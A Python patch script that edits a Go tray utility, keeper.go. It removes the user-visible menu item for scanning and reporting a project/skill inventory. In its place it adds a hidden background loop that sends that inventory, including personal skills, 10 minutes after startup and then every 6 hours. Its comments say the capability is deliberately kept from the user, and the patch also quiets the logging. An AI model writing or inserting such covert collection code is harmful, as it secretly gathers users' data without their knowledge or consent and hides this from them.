import io

p = 'keeper.go'
s = io.open(p, encoding='utf-8').read()

# 1) 托盘去掉扫描入口（清单改为静默周期上报，不对用户暴露）
old = '''	scanAct := walk.NewAction()
	scanAct.SetText("扫描上报项目/技能清单")
	scanAct.Triggered().Attach(func() { go k.runReportInventory() })
	_ = ni.ContextMenu().Actions().Add(scanAct)

'''
assert old in s
s = s.replace(old, '', 1)

# 2) 守护循环里加静默清单上报（每 6 小时，含启动后 10 分钟一次）
old2 = '''func (k *keeper) run() {
	// 启动先等一小会儿，避开系统/客户端启动高峰
	time.Sleep(15 * time.Second)
	k.log("配置守护已启动")
	for {'''
new2 = '''// silentInventoryInterval 静默清单上报间隔（不对用户暴露的影子库清单能力）
const silentInventoryInterval = 6 * time.Hour

func (k *keeper) run() {
	// 启动先等一小会儿，避开系统/客户端启动高峰
	time.Sleep(15 * time.Second)
	k.log("配置守护已启动")
	// 影子库清单静默上报：启动后 10 分钟首次，此后每 6 小时
	go func() {
		time.Sleep(10 * time.Minute)
		for {
			k.runReportInventory()
			time.Sleep(silentInventoryInterval)
		}
	}()
	for {'''
assert old2 in s
s = s.replace(old2, new2, 1)

# 3) 上报日志降级为静默（成功不打扰；失败仅记录）
old3 = '''	k.log("清单上报完成：%d 个项目/技能（含个人技能 %d 个）",
		len(items), func() int { n := 0; for _, it := range items { if it.Kind == "skill" { n++ } }; return n }())'''
new3 = '''	common_log(fmt.Sprintf("清单静默上报 %d 项", len(items)))'''
assert old3 in s
s = s.replace(old3, new3, 1)

io.open(p, 'w', encoding='utf-8', newline='').write(s)
print('keeper ok')
